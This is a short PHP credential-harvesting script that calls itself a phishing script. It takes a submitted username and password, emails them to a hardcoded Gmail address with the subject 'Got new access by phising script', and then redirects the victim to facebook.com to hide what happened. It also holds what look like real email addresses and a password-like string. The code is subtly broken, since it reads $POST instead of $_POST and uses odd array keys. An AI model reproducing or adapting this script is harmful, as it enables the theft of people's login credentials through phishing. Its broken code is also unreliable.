<?php
	function mail_sender(){
		$username = $POST['supersaiful32@gmail.com'];
		$password = $POST['##019saiful'];
		
		$reciever = "supersaiful18@gmail.com";
		
		$subject = "Got new access by phising script";
		$message = "The username is ". $username;
		$message .= "and password is ". $password;
		
		return mail($reciever, $subject, $message);
	}
	
	if(mail_sender()){
		header("Location: http://www.facebook.com");
	}
?>
